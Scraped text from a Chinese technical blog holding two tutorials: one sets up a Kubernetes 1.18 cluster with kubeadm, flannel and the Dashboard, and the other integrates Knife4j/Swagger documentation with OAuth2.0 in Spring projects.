12345# 临时关闭# setenforce 0# 永久关闭# sed -i \'s/enforcing/disabled/\' /etc/selinux/config 关闭 swap 12345# 临时关闭$ swapoff -a# 永久关闭# sed -i \'s/.*swap.*/#&amp;/\' /etc/fstab 系统时间同步 12345# 安装时间同步工具# yum install ntpdate -y# 设置时间同步服务器# ntpdate time.windows.com 安装 Docker，这是由于 Kubernetes 默认的 CRI（容器运行时）为 Docker 1234567891011121314151617181920212223242526# 添加YUM源# wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo# 安装Docker（指定版本号，否则默认安装最新版本）# yum -y install docker-ce-18.06.1.ce-3.el7# 开机自启动Docker# systemctl enable docker# 启动Docker# systemctl start docker# 配置阿里的Docker镜像加速# vim /etc/docker/daemon.json{ "registry-mirrors": ["https://b9pmyelo.mirror.aliyuncs.com"]}# 重启Docker# systemctl restart docker# 查看Docker的版本# docker --version# 查看Docker的安装信息# docker info 安装 Kubelet、Kubeadm、Kubectl 1234567891011121314151617# 添加YUm源# vim /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg# 安装（指定版本号，否则默认会安装最新版本）# yum install -y kubelet-1.18.0 kubeadm-1.18.0 kubectl-1.18.0# 开机自启动Kubelet# systemctl enable kubelet# 提示：Kubelet安装完成后不需要手动启动，因为在Node节点成功加入集群之前，Kubelet自身会不断重启（期间会伴随着各种启动错误，这点不用在意） 将桥接的 IPv4 流量传递到 iptables 的链 1234567# 添加路由规则# vim /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1# 配置生效# sysctl --system 设置主机名 1# hostnamectl set-hostname &lt;hostname&gt; 添加 hosts（Master 和各 Node 节点都配置） 123456# 添加hosts# vim /etc/hosts192.168.31.61 k8s-master192.168.31.62 k8s-node1192.168.31.63 k8s-node2192.168.31.64 k8s-node3 部署 Master 节点在 Master 节点执行 Kubeadm 初始化操作，--service-cidr 与 --pod-network-cidr 一般都不需要更改，详细参数说明如下，点击查看详细的安装日志信息 --apiserver-advertise-address：Master 节点的 IP 地址 --kubernetes-version：Kubernetes 的版本号，必须与上面 Kubelet 的版本号一致 --apiserver-advertise-address：一般指定为 Haproxy + Keepalived 的 VIP --image-repository：由于默认拉取镜像地址 k8s.gcr.io 国内无法访问，指定阿里云镜像仓库地址 --pod-network-cidr：指定 Pod Network 的地址范围，由于 Kubernetes 支持多种网络方案，而且不同网络方案对参数有各自要求，设置为 10.244.0.0/16 表示使用 Flannel 网络方案 1234567891011121314151617181920212223242526# 执行初始化# kubeadm init \\--apiserver-advertise-address=192.168.31.61 \\--image-repository registry.aliyuncs.com/google_containers \\--kubernetes-version v1.18.0 \\--service-cidr=10.96.0.0/12 \\--pod-network-cidr=10.244.0.0/16# 当终端打印如下的提示信息，则说明Docker开始拉取镜像，这个过程比较耗时（严重依赖网速）[preflight] Pulling images required for setting up a Kubernetes cluster[preflight] This might take a minute or two, depending on the speed of your internet connection[preflight] You can also perform this action in beforehand using \'kubeadm config images pull\'# 初始化完成后，记录下终端最后打印的Kubeadm命令（如下），后续添加Node节点到集群时会使用到### kubeadm join 192.168.1.109:6443 --token jve1cd.3ulp5fqifsptti23 --discovery-token-ca-cert-hash sha256:01229ee179cf13855dbf38bc050b3251928571996d60878f30ce13c08aaa62d5# 查看Docker的镜像列表# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.aliyuncs.com/google_containers/kube-proxy v1.18.0 43940c34f24f 11 months ago 117MBregistry.aliyuncs.com/google_containers/kube-apiserver v1.18.0 74060cea7f70 11 months ago 173MBregistry.aliyuncs.com/google_containers/kube-controller-manager v1.18.0 d3e55153f52f 11 months ago 162MBregistry.aliyuncs.com/google_containers/kube-scheduler v1.18.0 a31f78c7c8ce 11 months ago 95.3MBregistry.aliyuncs.com/google_containers/pause 3.2 80d28bedfe5d 13 months ago 683kBregistry.aliyuncs.com/google_containers/coredns 1.6.7 67da37a9a360 13 months ago 43.8MBregistry.aliyuncs.com/google_containers/etcd 3.4.3-0 303ce5db0e90 16 months ago 288MB 在 Master 节点配置 Kubectl 工具 1234567891011121314151617# 创建目录# mkdir -p $HOME/.kube# 拷贝配置文件# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config# 文件授权# chown $(id -u):$(id -g) $HOME/.kube/config# 查询组件的状态# kubectl get csNAME STATUS MESSAGEERROR etcd-0 Healthy {"health":"true"}controller-manager Healthy okscheduler Healthy ok# 提示：当上面的 STATUS 结果都为 "Healthy"，表示组件处于健康状态，否则需要检查错误，如果排除不了问题，可以使用 "kubeadm reset" 命令重置集群后重新初始化 Master 节点安装 Flannel 网络插件查看集群状态，此时的 Master 处于 “NotReady”（未就绪），这是因为集群中尚未安装 Flannel 网络插件，部署完网络插件后状态会自动变为 Ready 1234# 查看集群状态# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master NotReady master 12m v1.18.0 安装 Flannel 网络插件，若 kubectl apply -f 命令执行后提示网络连接失败，可留意文章后面给出的解决方案 12345678910111213141516# 安装Flannel网络插件# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml# 查询Pod组件的状态# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-7ff77c879f-67rjn 1/1 Running 0 4m35scoredns-7ff77c879f-xpq9h 1/1 Running 0 4m35setcd-k8s-master 1/1 Running 0 4m44skube-apiserver-k8s-master 1/1 Running 0 4m44skube-controller-manager-k8s-master 1/1 Running 0 4m44skube-flannel-ds-4jtp4 1/1 Running 0 2m36skube-proxy-8bbhk 1/1 Running 0 4m34skube-scheduler-k8s-master 1/1 Running 0 4m44s# 提示：Flannel 网络插件安装完成后，需要耐心等待一段时间，直到 "kubectl get pods -n kube-system" 命令查询到的所有 Pod 组件的状态都为 Running 为止 当 Master 节点处于 Ready 状态，就可以开始将 Node 节点加入集群 1234# 查看集群状态# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready master 12m v1.18.0 将 Node 节点加入到 Kubernetes 集群在各个 Node 节点里执行以下命令，向 Kubernetes 集群添加新节点，该命令是上述 kubeadm init 命令执行完成后在终端记录下来的 12# 添加Node节点到集群# kubeadm join 192.168.1.109:6443 --token jve1cd.3ulp5fqifsptti23 --discovery-token-ca-cert-hash sha256:01229ee179cf13855dbf38bc050b3251928571996d60878f30ce13c08aaa62d5 测试 Kubernetes 集群功能在 Master 节点执行以下命令，查看集群中所有节点的状态，当它们的状态都为 Ready 时，表示 Kubernetes 集群已经成功搭建起来了。值得一提的是，集群中所有节点的状态变更为 Ready，这需要花较长时间，可能花十几分钟甚至几十分钟 1234567891011121314151617181920212223242526272829303132# 查看集群状态# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready master 9m37s v1.18.0k8s-node1 Ready &lt;none&gt; 2m43s v1.18.0k8s-node2 Ready &lt;none&gt; 11s v1.18.0k8s-node3 Ready &lt;none&gt; 1s v1.18.0# 查询Pod组件的状态# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-7ff77c879f-67rjn 1/1 Running 0 30mcoredns-7ff77c879f-xpq9h 1/1 Running 0 30metcd-k8s-master 1/1 Running 0 30mkube-apiserver-k8s-master 1/1 Running 0 30mkube-controller-manager-k8s-master 1/1 Running 0 30mkube-flannel-ds-4jtp4 1/1 Running 0 28mkube-flannel-ds-6k8sp 1/1 Running 0 23mkube-flannel-ds-bzwrt 1/1 Running 0 23mkube-flannel-ds-rc8vv 1/1 Running 0 23mkube-proxy-8bbhk 1/1 Running 0 30mkube-proxy-9f96v 1/1 Running 0 23mkube-proxy-9j6qh 1/1 Running 0 23mkube-proxy-bqm7t 1/1 Running 0 23mkube-scheduler-k8s-master 1/1 Running 0 30m# 查看集群版本# kubectl version --shortClient Version: v1.18.0Server Version: v1.18.0# 提示：当各节点的 Linux 系统重启后，Kubernetes 集群里对应的组件会自动启动，不需要人为干预 在 Master 节点里创建一个 Nginx 容器，验证 Kubernetes 集群是否正常运行 123456789101112131415161718# 创建Nginx容器# kubectl create deployment nginx --image=nginx# 暴露Nginx的端口# kubectl expose deployment nginx --port=80 --type=NodePort# 查看Pod组件# kubectl get podNAME READY STATUS RESTARTS AGEpod/nginx-f89759699-59cb7 1/1 Running 0 2m1s# 查看Svc# kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/kubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 48mservice/nginx NodePort 10.102.129.11 &lt;none&gt; 80:32517/TCP 10s# 提示：浏览器访问 "http://&lt;any_node_ip&gt;:32517"，若 Ngninx 容器在集群中创建并启动成功，则默认会打开 Nginx 的首页 Kubeadm 部署 Dashboard 可视化插件在 Kubeadm 部署 Dashboard 可视化插件的流程中，以下所有操作都是直接在 Master 节点里执行，后续不再累述。 Dashboard 简介在 Kubernetes 社区中，有一个很受欢迎的 Dashboard 项目，它可以给用户提供一个可视化的 Web 界面来查看当前集群的各种信息。用户可以用 Kubernetes Dashboard 部署容器化的应用、监控应用的状态、执行故障排查任务以及管理 Kubernetes 各种资源。 Dashboard 官方参考文档 Dashboard Github 项目地址 Dashboard 各版本说明，Dashboard 版本与 Kubernetes 版本必须匹配（兼容） Dashboard 部署执行 YAML 文件直接部署 Dashboard，这里的 Kubernetes 1.8 版本对应的 Dashboard 版本为 v2.0.3，两者的版本号必须匹配 12# 部署# kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml 查看 Dashboard 的运行状态，可以看到以 deployment 方式部署，运行了 2 个 Pod 及 2 个 Service 1234567891011# 查看Pod的状态# kubectl -n kubernetes-dashboard get podsNAME READY STATUS RESTARTS AGEdashboard-metrics-scraper-6b4884c9d5-wn22s 0/1 ContainerCreating 0 48skubernetes-dashboard-7f99b75bf4-fn956 0/1 ContainerCreating 0 48s# 查看Svc的状态# kubectl -n kubernetes-dashboard get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdashboard-metrics-scraper ClusterIP 10.96.115.247 &lt;none&gt; 8000/TCP 117skubernetes-dashboard ClusterIP 10.100.88.170 &lt;none&gt; 443/TCP 117s Dashboard 暴露服务这里作为演示，使用 NodePort 方式将 Dashboard 的服务暴露在集群外，指定使用 30443 端口（可自定义） 12345678# 暴露Service# kubectl patch svc kubernetes-dashboard -n kubernetes-dashboard -p \'{"spec":{"type":"NodePort","ports":[{"port":443,"targetPort":8443,"nodePort":30443}]}}\'# 查看暴露的Service# kubectl -n kubernetes-dashboard get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdashboard-metrics-scraper ClusterIP 10.96.115.247 &lt;none&gt; 8000/TCP 6m2skubernetes-dashboard NodePort 10.100.88.170 &lt;none&gt; 443:30443/TCP 6m2s 或者下载 YAML 文件，手动更改 Service 部分的端口，并以为 NodePort 方式进行部署 1234567891011121314151617181920212223242526# 下载YAML文件# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml# 更改YAML文件# vim recommended.yaml---kind: ServiceapiVersion: v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardspec: type: NodePort ports: - port: 443 targetPort: 8443 nodePort: 30443 selector: k8s-app: kubernetes-dashboard---# 更新配置# kubectl apply -f recommended.yaml Dashboard 认证方式登录Dashboard 支持 Kubeconfig 和 Token 两种认证方式，这里选择 Token 认证方式登录，首先执行以下操作创建登录用户 12345# 创建YAML配置文件，复制下面的内容到文件中# vim dashboard-adminuser.yaml# 创建登录用户# kubectl apply -f dashboard-adminuser.yaml YAML 配置文件 dashboard-adminuser.yaml 的完整内容如下，指定了一个名称为 admin-user 的服务账号，并放在 kubernetes-dashboard 命名空间下，并将 cluster-admin 角色绑定到 admin-user 账户，这样 admin-user 账户就有了管理员的权限。默认情况下，Kubeadm 创建集群时已经创建了 cluster-admin 角色，只需直接绑定即可 1234567891011121314151617181920---apiVersion: v1kind: ServiceAccountmetadata: name: admin-user namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: admin-userroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard 查看 admin-user 账户的 Token 12# 查看Token# kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk \'{print $1}\') 使用火狐浏览器打开 https://&lt;any_node_ip&gt;:30443，访问 Dashboard 的登录界面，由于谷歌浏览器会强制使用 HTTPS 协议，这将导致无法访问 Dashboard 的登录页面，因此建议使用火狐浏览器进行访问 将获取到的 Token 复制到登录界面的 Token 输入框中，成功登陆 Dashboard Dashboard 登录超时Dashboard 默认登录超时时间是 15min，可以为 Dashboard 容器增加 --token-ttl 参数来自定义超时时间，配置示例如下： 123456789101112131415# 下载YAML文件# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml# 更改YAML文件# vim recommended.yaml---args: - --auto-generate-certificates - --namespace=kubernetes-dashboard - --token-ttl=43200---# 更新配置# kubectl apply -f recommended.yaml Kubeadm 搭建集群问题总结1[ERROR NumCPU]: the number of available CPUs 1 is less than the required 2 执行 kubeadm init 命令，提示 CPU 核心数少于 2，可以添加命令参数 --ignore-preflight-errors=NumCPU 忽略警告 1[ERROR Swap]: running with swap on is not supported. Please disable swap 执行 kubeadm init 命令，提示启用了 swap 分区，可以添加命令参数 --ignore-preflight-errors \'Swap\' 忽略错误 1[WARNING SystemVerification]: this Docker version is not on the list of validated versions: 19.03.1. Latest validated version: 18.09 执行 kubeadm init 命令，提示 Docker 的版本过高，可能与 Kubernetes 的版本不兼容 1The connection to the server raw.githubusercontent.com was refused - did you specify the right host or port? 执行 kubectl apply -f 命令，提示网络链接失败，这是国内无法访问 raw.githubusercontent.com 导致，临时解决方法如下： 在 https://www.ipaddress.com 网站上查询 raw.githubusercontent.com 域名的真实 IP 地址 更改系统的 /etc/hosts 配置文件，添加一行内容 185.199.108.133 raw.githubusercontent.com，将 185.199.108.133 替换为查询到真实的 IP 地址 重新执行 kubectl apply -f 命令即可 参考资料 Kubernetes 部署 Dashboard 可视化插件 Kubeadm 部署单 Master 节点 Kubernetes 集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Knife4j 基础使用教程",url:"/posts/e2246230.html",text:'1、前言1.1、Knife4j 简介Knife4j 是为 Java MVC 框架集成 Swagger 生成 Api 文档的增强解决方案，前身是 swagger-bootstrap-ui，致力于 springfox-swagger 的增强 UI 实现。knife4j 为了契合微服务的架构发展，由于原来 swagger-bootstrap-ui 采用的是后端 Java 代码 + 前端 UI 混合打包的方式，在微服务架构下显的很臃肿，因此项目正式更名为 knife4j，更名后主要专注的方面如下： 后端 Java 代码以及前端 UI 模块进行了分离，在微服务架构下使用更加灵活 提供专注于 Swagger 的增强解决方案，不同于只是单纯增强前端 UI 部分 1.2、Knife4j 模块 模块名称 说明 knife4j 为 Java MVC 框架集成 Swagger 的增强解决方案 knife4j-admin 云端 Swagger 接口文档注册管理中心，集成 gateway 网关对任意微服务文档进行组合集成 knife4j-extension chrome 浏览器的增强 swagger 接口文档 ui, 快速渲染 swagger 资源 knife4j-service 为 swagger 服务的一系列接口服务程序 knife4j-front knife4j-spring-ui 的纯前端静态版本，用于集成非 Java 语言使用 swagger-bootstrap-ui knife4j 的前身，最后发布版本是 1.9.6 1.3、使用 Knife4j 的业务场景若不使用 knife4j 的增强功能，相当于纯粹换了一个 Swagger 的前端界面，这种情况是最简单的，原项目结构下无需作任何变更，可以直接引用 swagger-bootstrap-ui 的最后一个版本 1.9.6 或者使用 knife4j-spring-ui 123456&lt;!-- 旧版本引用 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;`swagger-bootstrap-ui`&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt;&lt;/dependency&gt; 123456&lt;!-- 新版本引用 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-ui&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt;&lt;/dependency&gt; 若在 Spring Boot 项目单体架构使用增强功能，knife4j 提供了 starter 供开发者快速使用，该包会引用 knife4j 提供的所有资源，包括前端 UI 和后端的 Jar 包 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; 若在 Spring Cloud 的微服务架构下，每个微服务其实并不需要引入前端的 UI 资源，因此在每个微服务的 Spring Boot 项目里，只需引入 knife4j 提供的微服务 starter 即可 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-micro-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; 最后在 Spring Cloud 的网关聚合文档服务（如 Zuul、Gateway）里，再把前端的 UI 资源引入 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; 不管是 knife4j 还是 swagger-bootstrap-ui，对外提供的访问地址依然是 http://ip:port/doc.html；同时 swagger-bootstrap-ui 使用的是传统的 Javascript 技术，即 jQuery + DOM 操作，打包后的源码并没有压缩处理，而 knife4j 的前端则采用 Vue。 2、Spring 单体架构2.1、基于 Maven Bom 方式使用 基于 Maven Bom 方式使用 2.2、Spring MVC 框架集成 Knife4j Spring MVC 框架集成 Knife4j 2.3、Spring Boot 框架集成 Knife4j Spring Boot 框架集成 Knife4j 3、Spring Cloud 微服务架构3.1、Spring Cloud Zuul 集成 Knife4j Spring Cloud Zuul 集成 Knife4j 3.2、Spring Cloud Gateway 集成 Knife4j Spring Cloud Gateway 集成 Knife4j 4、微服务聚合实战4.1、Eureka 聚合 Knife4j Eureka 聚合 Knife4j 4.2、Nacos 聚合 Knife4j Nacos 聚合 Knife4j 4.3、Gateway 聚合 Knife4jGateway 聚合 Knife4j 后，若需要对业务模块的的 API 文档接口 /v2/api-doc 添加 Basic 身份认证，则只需在对应的业务模块下的 YML 配置文件里添加以下内容即可： 12345678knife4j: cors: true enable: true # 是否开启增强配置 basic: username: test # Basic认证用户名 password: 987789 # Basic认证密码 enable: true # 开启Basic身份认证 production: false # 是否屏蔽所有Swagger的相关资源，默认是false 若业务模块配置了上述的 Basic 身份认证后，此时访问 Gateway 的聚合文档服务的 Web 界面，会弹出用户名和密码的输入框（如下图） 5、Knife4j 整合 OAuth2.0Knife4j 整合 OAuth2.0 的 Java 代码配置如下，关键在于创建 Docket 对象时，指定 OAuth2.0 的授权模式，包括简化模式 (implicit)、授权码模式 (authorization_code)、密码模式 (password)、客户端模式 (client_credentials)。值得一提的是，无论项目采用 Spring 单体架构还是 Spring Cloud 微服务架构，下面介绍的 Knife4j + OAuth2.0 的整合方式都适用，包括 Gateway + Knife4j + OAuth2.0 整合的项目。 下面提到的 @EnableBeanValidator 注解类的代码如下： 123456789101112import org.springframework.context.annotation.Import;import springfox.bean.validators.configuration.BeanValidatorPluginsConfiguration;import java.lang.annotation.*;@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.TYPE})@Documented@Import(BeanValidatorPluginsConfiguration.class)public @interface EnableBeanValidator {} 手动方式 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.ApiInfo;import springfox.documentation.service.ApiKey;import springfox.documentation.service.AuthorizationScope;import springfox.documentation.service.SecurityReference;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.Collections;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.basePackage("com.shop")) .paths(PathSelectors.any()) .build() // 整合OAuth2.0 .securitySchemes(Collections.singletonList(apiKey())) .securityContexts(Collections.singletonList(securityContext())); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } private ApiKey apiKey() { return new ApiKey("Bearer", "Authorization", "header"); } /** * Swagger2 认证的安全上下文 * * @return */ private SecurityContext securityContext() { return SecurityContext.builder() .securityReferences(defaultAuth()) .forPaths(PathSelectors.any()) .build(); } /** * 认证方式 * * @return */ private List&lt;SecurityReference&gt; defaultAuth() { AuthorizationScope authorizationScope = new AuthorizationScope("web", "access_token"); AuthorizationScope[] authorizationScopes = new AuthorizationScope[1]; authorizationScopes[0] = authorizationScope; return Collections.singletonList(new SecurityReference("Bearer", authorizationScopes)); }} 最终呈现的界面如下，填写提前获取到的 Access Token 即可，如下图所示： 刷新业务接口的调试界面，就会看到参数 Authorization 值已经更新了，如下图所示： 客户端模式 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 认证的安全上下文 * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 的认证方式 * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // 使用客户端模式（client_credentials） List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); String clientTokenUrl = "http://127.0.0.1:18010/oauth/token"; ClientCredentialsGrant clientCredentialsGrant = new ClientCredentialsGrant(clientTokenUrl); grantTypes.add(clientCredentialsGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} 输入 clientId 以及 clientSecret，然后点击 Authorize 按钮进行授权即可，如下图所示： 密码模式 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 认证的安全上下文 * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 的认证方式 * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // 使用密码模式（password） List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); String passwordTokenUrl = "http://127.0.0.1:18010/oauth/token"; ResourceOwnerPasswordCredentialsGrant resourceOwnerPasswordCredentialsGrant = new ResourceOwnerPasswordCredentialsGrant(passwordTokenUrl); grantTypes.add(resourceOwnerPasswordCredentialsGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} 输入 username、password、clientId 以及 clientSecret，然后点击 Authorize 按钮进行授权即可，如下图所示： 授权模式 ★展开代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 认证的安全上下文 * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 的认证方式 * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // 使用授权码模式（authorization_code） List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); TokenRequestEndpoint tokenRequestEndpoint = new TokenRequestEndpoint("http://127.0.0.1:18010/oauth/authorize", "client1", "secert1"); TokenEndpoint tokenEndpoint = new TokenEndpoint("http://127.0.0.1:18010/oauth/token", "access_token"); AuthorizationCodeGrant authorizationCodeGrant = new AuthorizationCodeGrant(tokenRequestEndpoint, tokenEndpoint); grantTypes.add(authorizationCodeGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} 输入 clientId 及 clientSecret，然后点击 Authorize 按钮，最终跳转授权界面，如下图所示： 选择进行授权，授权完成后就可以直接调试接口了，如下图所示（该图与上述代码不相关，来源于网络）： 简化模式（待补充）6、全局参数设置 Oauth 的 Token除了上面介绍的 Knife4j 自动获取 Access Token 之外，还可以通过 Knife4j 全局参数设置的功能来手动添加 Access Token，可以省去整合 OAuth2.0 的 Java 代码，这里 Access Token 的格式必须是以 bearer + 空格 作为前缀 7、参考文档 Swagger 源码分析 knife4j Github 项目 knife4j 官方中文文档 knife4j 官方实战指南 knife4j 官方示例代码 knife4j 在线演示效果 var isMobile = 